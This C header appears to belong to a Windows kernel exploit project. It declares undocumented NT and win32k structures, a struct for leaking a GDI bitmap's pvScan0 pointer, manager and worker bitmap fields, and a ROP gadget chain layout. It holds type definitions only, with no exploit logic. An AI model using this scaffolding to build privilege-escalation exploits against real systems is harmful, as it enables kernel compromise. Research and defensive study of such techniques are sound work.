#pragma once

#include <Windows.h>

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, *PSERVERINFO;

typedef struct _USER_HANDLE_ENTRY {
	void    *pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, *PUSER_HANDLE_ENTRY;

typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, *PSHAREDINFO;

typedef struct _LeakBitmapInfo {
	HBITMAP hBitmap;
	PUCHAR pBitmapPvScan0;
} LeakBitmapInfo, *pLeakBitmapInfo;

typedef struct _ROP {
	PUCHAR PopRaxRet;
	PUCHAR pWorkerBitmapPvScan0;
	PUCHAR PopR8Ret;
	PUCHAR pManagerBitmapPvScan0;
	PUCHAR MovQwR8RaxRet;
	PUCHAR XorRaxRaxRet;
	PUCHAR PopRsiRet;
	PUCHAR pZero1;
	PUCHAR PopRdiRet;
	PUCHAR pZero2;
} ROP, *PROP;

typedef struct _KERNELINFO {
	PUCHAR pKernelBase;
	PUCHAR pFunctionAddress;
} KERNELINFO, *PKERNELINFO;

typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI *_RtlGetVersion)(
	LPOSVERSIONINFOEXW lpVersionInformation
	);
